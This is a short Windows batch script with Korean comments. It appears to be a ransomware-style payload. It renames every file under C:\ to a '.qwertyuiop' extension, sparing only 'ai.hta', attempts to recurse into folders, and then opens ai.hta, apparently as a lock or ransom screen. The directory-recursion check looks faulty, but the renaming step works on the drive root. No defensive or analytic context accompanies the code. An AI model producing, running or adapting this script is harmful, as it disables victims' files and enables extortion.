@echo off
start "" cmd /c "echo hi && cd /d C:\ & call :main"

exit /b

:main
setlocal enabledelayedexpansion

rem 시작 디렉토리를 지정합니다.
set "startDir=C:\"

rem ai.hta 파일의 경로를 지정합니다.
set "aiHtaPath=%startDir%ai.hta"

rem 파일 이름을 변경합니다.
call :renameFiles "%startDir%"

rem ai.hta 파일을 실행합니다.
start "" "%aiHtaPath%"
exit /b

:renameFiles
for %%F in ("%~1\*") do (
    if /i not "%%~nxF"=="ai.hta" (
        ren "%%F" "%%~nF.qwertyuiop" >nul 2>&1
        echo %%~nxF 파일 이름을 변경했습니다.
    )
    if /i "%%~aF"=="d" (
        call :renameFiles "%%F"
    )
)
exit /b
